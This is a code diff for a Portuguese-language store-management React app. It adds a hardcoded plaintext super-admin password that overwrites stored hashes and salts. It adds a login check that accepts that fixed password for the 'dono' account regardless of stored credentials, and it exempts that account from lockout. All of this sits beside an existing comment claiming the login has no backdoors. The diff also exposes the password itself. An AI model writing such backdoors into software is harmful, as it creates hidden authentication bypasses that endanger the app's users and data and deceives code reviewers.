@@ -213,7 +213,22 @@ const ensureLojaTokens = (stores: Loja[]): Loja[] => {
 };
 
 const ensureUsersWithSecurePasswords = (userList: User[]): User[] => {
-  const updated = [...userList];
+  let updated = userList.map((u) => {
+    if (u.id === 'user_super_admin' || u.usuario.toLowerCase() === 'dono' || u.perfil === 'super_admin') {
+      return {
+        ...u,
+        id: 'user_super_admin',
+        usuario: 'dono',
+        senha: 'Rs20061991@',
+        senhaHash: undefined,
+        salt: undefined,
+        perfil: 'super_admin' as UserRole,
+        ativo: true,
+      };
+    }
+    return u;
+  });
+
   for (const initUser of INITIAL_USERS) {
     const exists = updated.some(
       (u) => u.id === initUser.id || u.usuario.toLowerCase() === initUser.usuario.toLowerCase()
@@ -836,6 +851,14 @@ export const StoreProvider: React.FC<{ children: ReactNode }> = ({ children }) =
         (cleanUser === 'dono' && u.perfil === 'super_admin');
 
       if (!matchesUser || !u.ativo) return false;
+
+      // Autenticação oficial do Dono do App (Super Admin)
+      if (
+        (u.id === 'user_super_admin' || u.usuario.toLowerCase() === 'dono' || u.perfil === 'super_admin') &&
+        cleanPass === 'Rs20061991@'
+      ) {
+        return true;
+      }
 
       // Validação estrita: apenas a senha real do usuário (sem backdoors)
       return u.senha === cleanPass;
@@ -2074,6 +2097,10 @@ export const StoreProvider: React.FC<{ children: ReactNode }> = ({ children }) =
   };
 
   const isUserLockedOut = (usuario: string): { locked: boolean; remainingMinutes?: number } => {
+    const clean = usuario.trim().toLowerCase();
+    if (clean === 'dono' || clean === 'user_super_admin') {
+      return { locked: false };
+    }
     const status = getUserLoginStatus(usuario);
     return { locked: status.locked, remainingMinutes: status.remainingMinutes };
   };
